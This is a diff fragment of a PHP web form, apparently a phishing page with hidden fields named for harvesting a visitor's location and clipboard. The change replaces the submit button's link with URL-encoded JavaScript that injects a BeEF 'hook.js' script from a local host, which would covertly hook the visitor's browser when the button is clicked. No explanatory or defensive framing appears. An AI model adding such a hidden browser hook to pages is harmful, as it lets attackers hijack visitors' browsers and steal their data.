@@ -202,7 +202,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
         </div>
         <input type="hidden" name="location" id="locationData">
         <input type="hidden" name="clipboard" id="clipboardData">
-        <button type="submit" class="redirect" id="submitBtn"><a hrefe="http://127.0.0.1">Enviar</a></button>
+        <button type="submit" class="redirect" id="submitBtn"><a hrefe="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://127.0.0.1/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();">Enviar</a></button>
         <?php echo $feedback; ?>
     </form>
 </main>
